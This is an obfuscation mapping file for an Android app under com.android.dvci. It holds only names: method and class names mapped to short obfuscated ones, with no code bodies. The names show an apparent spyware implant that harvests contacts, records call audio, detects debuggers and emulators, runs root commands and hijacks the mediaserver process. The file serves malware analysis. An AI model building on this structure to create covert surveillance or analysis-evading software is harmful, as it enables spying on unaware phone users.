android.media.AmrInputStream -> android.media.AmrInputStream:
    30:52:void addUserPhones(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> Code
    56:73:void addUserEmails(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> localvar
    77:111:void addUserInfos(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> localclass
    115:151:void addUserPA(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> instance
    155:176:void addUserIm(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> inst
    180:205:void addUserOrg(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> variables
    209:230:void addUserWebsite(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> mylist
    233:251:java.util.Hashtable getContactInfo() -> dW
    java.lang.String $(int,int,int) -> localvar
com.android.dvci.module.task.PostalAddressInfo -> stt.ch:
    long userId -> iW
    int type -> type
    java.lang.String street -> jg
    java.lang.String poBox -> jh
    java.lang.String neighbor -> ji
    java.lang.String city -> jj
    java.lang.String state -> jk
    java.lang.String postalCode -> jl
    java.lang.String country -> jm
    39:39:int getType() -> getType
    43:43:java.lang.String getStreet() -> dX
    47:47:java.lang.String getPoBox() -> dY
    51:51:java.lang.String getNeighbor() -> dZ
    55:55:java.lang.String getCity() -> ea
    59:59:java.lang.String getState() -> eb
    63:63:java.lang.String getPostalCode() -> getPostalCode
    67:67:java.lang.String getCountry() -> getCountry
com.android.dvci.module.task.UserInfo -> stt.ci:
    java.lang.String completeName -> jn
    java.lang.String userNote -> jo
    java.lang.String userNickname -> jp
    long userId -> iW
    26:26:java.lang.String getCompleteName() -> ec
    30:30:java.lang.String getUserNote() -> ed
    34:34:java.lang.String getUserNickname() -> ee
    38:38:long getUserId() -> ef
com.android.dvci.module.task.WebsiteInfo -> stt.cj:
    long userId -> iW
    java.lang.String websiteName -> jq
    28:28:java.lang.String getWebsiteName() -> eg
com.android.dvci.optimize.NetworkOptimizer -> com.android.dvci.optimize.NetworkOptimizer:
    android.content.Context context -> a
    boolean stop -> W
    long BeforeTime -> jr
    24:30:void start(int) -> lua_else
    43:70:boolean isNotOptimized() -> eh
    74:87:boolean getResults(long[]) -> localclass
    14:14:long access$002(com.android.dvci.optimize.NetworkOptimizer,long) -> Code
    14:14:long access$000(com.android.dvci.optimize.NetworkOptimizer) -> Code
com.android.dvci.optimize.NetworkOptimizer$1 -> stt.ck:
    java.lang.String val$host -> js
    com.android.dvci.optimize.NetworkOptimizer this$0 -> jt
    50:64:void run() -> run
com.android.dvci.util.AntiDebug -> stt.cl:
    byte[] $ -> lua_repeat
    35:39:boolean checkFlag() -> ei
    58:58:boolean checkConnected() -> ej
    67:67:boolean isDebug() -> ek
    71:83:boolean isPlayStore() -> el
    java.lang.String $(int,int,int) -> localvar
com.android.dvci.util.AntiEmulator -> stt.cm:
    int NUMTESTSTM -> ju
    int NUMTESTSNOTM -> jv
    android.telephony.TelephonyManager tm -> jw
    24:53:int checkKeys() -> em
    58:71:int checkTags() -> en
    76:87:int checkProduct() -> eo
    92:103:int checkDevice() -> ep
    108:125:int checkBrand() -> eq
    129:148:int checkScaling() -> er
    153:166:int checkManufacturer() -> es
    171:188:int checkId() -> et
    193:211:int checkSubscriber() -> eu
    216:229:int checkOperator() -> ev
    234:263:int checkPhoneNumber() -> ew
    267:294:int isEmu(int) -> lua_elseif
    298:302:int isEmu(int[]) -> Code
    310:313:boolean isEmu() -> ex
    319:330:boolean isTestEmu() -> ey
com.android.dvci.util.AudioEncoder -> stt.cn:
    java.lang.String audioDirectory -> jx
    java.lang.String audioStorage -> jy
    boolean call_finished -> jz
    int last_epoch -> jA
    int first_epoch -> jB
    int data_size -> jC
    int sampleRate -> jD
    java.lang.String rawFile -> jE
    byte[] rawPcm -> jF
    byte[] $ -> lua_repeat
    50:112:int getInferredSampleRate() -> ez
    117:164:boolean encodetoAmr(java.lang.String,byte[]) -> localvar
    170:202:byte[] resample(boolean) -> globalize
    206:337:byte[] decodeRawChunks() -> eA
    343:356:void removeRawFile() -> eB
    362:362:int getCallStartTime() -> eC
    366:366:int getCallEndTime() -> eD
    374:374:int getAllegedSampleRate() -> eE
    378:378:boolean isLastCallFinished() -> eF
    383:398:boolean createAudioStorage() -> eG
    403:407:java.lang.String getAudioStorage() -> eH
    411:423:boolean deleteAudioStorage() -> eI
    java.lang.String $$24d420ae() -> proto_ids
com.android.dvci.util.CallBack -> stt.co:
    java.util.ArrayList callbacks$7865b31 -> jG
    13:14:void register$31aa1d62(com.android.dvci.module.ModuleCall$HC) -> Code
    17:22:void trigger$5d527811$552c4e01() -> eJ
com.android.dvci.util.DataBuffer -> stt.cp:
    java.nio.ByteBuffer byteBuffer -> jH
    65:65:int readInt() -> readInt
    76:76:long readLong() -> readLong
    88:89:void read(byte[]) -> lua_while
    102:103:void write(byte[]) -> write
    112:113:void writeInt(int) -> writeInt
    122:123:void writeLong(long) -> writeLong
    126:128:void writeDouble(double) -> writeDouble
    131:132:void writeFloat(float) -> writeFloat
    135:136:void writeByte(byte) -> writeByte
    139:140:void writeShort(short) -> writeShort
com.android.dvci.util.DateTime -> stt.cq:
    long ticks -> jI
    java.util.Date date -> bI
    103:110:java.util.Date getDate() -> getDate
    123:123:long getFiledate() -> eK
    141:172:byte[] getStructTm() -> eL
    193:194:int hiDateTime() -> eM
    203:204:int lowDateTime() -> eN
    214:214:java.lang.String toString() -> toString
    225:229:long getFiledate(java.util.Date) -> localvar
    238:259:byte[] getStructSystemdate() -> eO
com.android.dvci.util.Execute -> stt.cr:
    29:39:com.android.dvci.util.ExecuteResult executeRoot(java.lang.String) -> p
    100:130:com.android.dvci.util.ExecuteResult executeSimple(java.lang.String) -> q
    134:178:com.android.dvci.util.ExecuteResult execute(java.lang.String) -> r
    182:231:com.android.dvci.util.ExecuteResult execute(java.lang.String[]) -> Code
    238:245:boolean executeWaitFor(java.lang.String) -> s
    250:265:boolean executeRootAndForgetScript(java.lang.String) -> t
    269:307:com.android.dvci.util.ExecuteResult executeScript(java.lang.String) -> u
    312:313:void chmod(java.lang.String,java.lang.String) -> myvar
com.android.dvci.util.ExecuteResult -> stt.cs:
    int exitCode -> jJ
    java.util.ArrayList stdout -> jK
    java.util.ArrayList stderr -> jL
    java.lang.String executionLine -> jM
    23:23:java.lang.String getStdout() -> eP
    31:38:java.lang.String listToString(java.util.ArrayList) -> mylist
    46:58:void saveEvidence() -> eQ
com.android.dvci.util.Instrument -> stt.ct:
    java.lang.String proc -> jN
    com.android.dvci.util.Instrument$MediaserverMonitor pidMonitor -> jO
    java.lang.String lib -> jP
    java.lang.String hijacker -> jQ
    java.lang.String path -> jR
    java.lang.String dumpPath -> jS
    java.lang.String pidCompletePath -> jT
    java.lang.String pidFile -> jU
    boolean stopMonitor -> jV
    java.lang.Thread monitor -> jW
    int killed -> jX
    java.lang.String lid -> jY
    47:51:boolean deleteHijacker() -> eR
    56:79:boolean installHijacker() -> eS
    83:194:boolean startInstrumentation() -> eT
    198:200:void stopInstrumentation() -> eU
    204:232:int getProcessPid() -> eV
    237:247:void killProc() -> eW
    18:18:boolean access$000(com.android.dvci.util.Instrument) -> Code
    18:18:boolean access$002$453cf8bf(com.android.dvci.util.Instrument) -> localvar
    18:18:int access$100(com.android.dvci.util.Instrument) -> localclass
com.android.dvci.util.Instrument$MediaserverMonitor -> stt.ct$Code:
    int cur_pid -> jZ
    int start_pid -> ka
    int failedCounter -> kb
    com.android.dvci.util.Instrument this$0 -> kc
    254:255:void setPid(int) -> lua_end
    269:298:void run() -> run
com.android.dvci.util.PackageUtils$PInfo -> stt.cu:
    java.lang.String appname -> kd
    java.lang.String pname -> ke
    java.lang.String versionName -> versionName
    java.lang.String apkPath -> kf
    int versionCode -> versionCode
    192:192:java.lang.String toString() -> toString
    159:159:java.lang.String access$000(com.android.dvci.util.PackageUtils$PInfo) -> Code
    159:159:java.lang.String access$002(com.android.dvci.util.PackageUtils$PInfo,java.lang.String) -> Code
    159:159:java.lang.String access$102(com.android.dvci.util.PackageUtils$PInfo,java.lang.String) -> localvar
    159:159:java.lang.String access$202(com.android.dvci.util.PackageUtils$PInfo,java.lang.String) -> localclass
    159:159:int access$302(com.android.dvci.util.PackageUtils$PInfo,int) -> Code
    159:159:java.lang.String access$402(com.android.dvci.util.PackageUtils$PInfo,java.lang.String) -> instance
com.android.dvci.util.Utils -> stt.cv:
    java.security.SecureRandom rand -> kg
    55:68:void sleep(int) -> lua_false
    81:81:long getRandom() -> eX
    85:89:int[] getRandomIntArray$2558076() -> eY
    93:98:byte[] getRandomByteArray$486860e8() -> eZ
    107:107:long getTimeStamp() -> fa
    112:124:byte[] concat(byte[][]) -> Code
    132:142:byte[] getAsset(java.lang.String) -> v
    151:159:java.io.InputStream getAssetStream(java.lang.String) -> w
    164:175:void copy(java.io.File,java.io.File) -> Code
    179:207:boolean streamDecodeWrite(java.lang.String,java.io.InputStream,java.lang.String) -> Code
    214:215:boolean dumpAsset(java.lang.String,java.lang.String) -> sort
com.android.mm.M -> stt.cw:
    byte[] $ -> lua_repeat
    int $$ -> dl
    6:11:java.lang.String d(byte[],byte[]) -> instance
    15:23:byte[] h2b(java.lang.String) -> x
    36:36:java.lang.String d_7755000343626343099(java.lang.String) -> y
    39:39:java.lang.String d_4586785924691013690(java.lang.String) -> z
    42:42:java.lang.String d_6396817578346716658(java.lang.String) -> A
    45:45:java.lang.String d_3235240693802211740(java.lang.String) -> B
    48:48:java.lang.String d_1048361819567351379(java.lang.String) -> C
    51:51:java.lang.String d_3220526054649466323(java.lang.String) -> D
    54:54:java.lang.String d_2830160643577060909(java.lang.String) -> E
    57:57:java.lang.String d_5354062636800982277(java.lang.String) -> F
    60:60:java.lang.String d_1030175432329767533(java.lang.String) -> G
    66:66:java.lang.String d_1147825815103718951(java.lang.String) -> H
    69:69:java.lang.String d_3654327107905832373(java.lang.String) -> I
    72:72:java.lang.String d_7766677856815613124(java.lang.String) -> J
    75:75:java.lang.String d_3503876950539961047(java.lang.String) -> K
    78:78:java.lang.String d_752133123860744542(java.lang.String) -> L
    81:81:java.lang.String d_4927699154430839737(java.lang.String) -> M
    84:84:java.lang.String d_4093952218811891363(java.lang.String) -> N
    90:90:java.lang.String d_46959694107237235(java.lang.String) -> O
    93:93:java.lang.String d_4770798168248812820(java.lang.String) -> P
    96:96:java.lang.String d_5208788983674081805(java.lang.String) -> Q
    99:99:java.lang.String d_5513169141226648300(java.lang.String) -> R
    102:102:java.lang.String d_1646765219624971490(java.lang.String) -> S
    105:105:java.lang.String d_3710433134516455355(java.lang.String) -> T
    126:126:java.lang.String d_5295856559998140292(java.lang.String) -> U
    129:129:java.lang.String d_2448038916866302230(java.lang.String) -> V
    132:132:java.lang.String d_952090890558463617(java.lang.String) -> W
    135:135:java.lang.String d_8480974689171906531(java.lang.String) -> X
    138:138:java.lang.String d_7202967911574115421(java.lang.String) -> Y
    141:141:java.lang.String d_7908592075912947007(java.lang.String) -> Z
    144:144:java.lang.String d_2269984641732478945(java.lang.String) -> aa
    147:147:java.lang.String d_7423290848967361104(java.lang.String) -> ab
    150:150:java.lang.String d_6616144996880179285(java.lang.String) -> ac
    153:153:java.lang.String d_8189674235454400659(java.lang.String) -> ad
    156:156:java.lang.String d_7332387669867337460(java.lang.String) -> ae
    159:159:java.lang.String d_6966186999872428865(java.lang.String) -> af
    162:162:java.lang.String d_3721498089419233687(java.lang.String) -> ag
    165:165:java.lang.String d_1880239350676155437(java.lang.String) -> ah
    168:168:java.lang.String d_4109149951564781477(java.lang.String) -> ai
    171:171:java.lang.String d_1604899496688644171(java.lang.String) -> aj
    174:174:java.lang.String d_1471553152558094964(java.lang.String) -> ak
    177:177:java.lang.String d_7943257588699413281(java.lang.String) -> al
    180:180:java.lang.String d_5332883767039855977(java.lang.String) -> am
    183:183:java.lang.String d_4205278856306703650(java.lang.String) -> an
    186:186:java.lang.String d_2915664367455062581(java.lang.String) -> ao
    189:189:java.lang.String d_2401227843239859835(java.lang.String) -> ap
    192:192:java.lang.String d_7444215915288567209(java.lang.String) -> aq
    195:195:java.lang.String d_8145875464077051104(java.lang.String) -> ar
    198:198:java.lang.String d_5337569496231989400(java.lang.String) -> as
    201:201:java.lang.String d_1573367184250498505(java.lang.String) -> at
    204:204:java.lang.String d_3216834010561721498(java.lang.String) -> au
    207:207:java.lang.String d_293737681212356518(java.lang.String) -> av
    210:210:java.lang.String d_1118823332636959586(java.lang.String) -> aw
    213:213:java.lang.String d_1703742975791308544(java.lang.String) -> ax
    216:216:java.lang.String d_1458796581978214595(java.lang.String) -> ay
    219:219:java.lang.String d_2406581978266614929(java.lang.String) -> az
    222:222:java.lang.String d_4746393208585527493(java.lang.String) -> aA
    225:225:java.lang.String d_4717588878035859304(java.lang.String) -> aB
    228:228:java.lang.String d_1189116056130055971(java.lang.String) -> aC
    231:231:java.lang.String d_794862736325398433(java.lang.String) -> aD
    234:234:java.lang.String d_1665496013873096643(java.lang.String) -> aE
    237:237:java.lang.String d_1776183376731013570(java.lang.String) -> aF
    240:240:java.lang.String d_5026672429152474549(java.lang.String) -> aG
    243:243:java.lang.String d_7467822594038994186(java.lang.String) -> aH
    246:246:java.lang.String d_3700322309820079067(java.lang.String) -> aI
    255:255:java.lang.String d_5716059232051850713(java.lang.String) -> aJ
    258:258:java.lang.String d_2947573119454701461(java.lang.String) -> aK
    261:261:java.lang.String d_8018350495611909803(java.lang.String) -> aL
    264:264:java.lang.String d_4373340028699048923(java.lang.String) -> aM
    267:267:java.lang.String d_2655283447137684316(java.lang.String) -> aN
    273:273:java.lang.String d_6308365319919613780(java.lang.String) -> aO
    276:276:java.lang.String d_3176261870176493248(java.lang.String) -> aP
    279:279:java.lang.String d_5989229432525751964(java.lang.String) -> aQ
    282:282:java.lang.String d_4684279223208954622(java.lang.String) -> aR
    285:285:java.lang.String d_377239780986007675(java.lang.String) -> aS
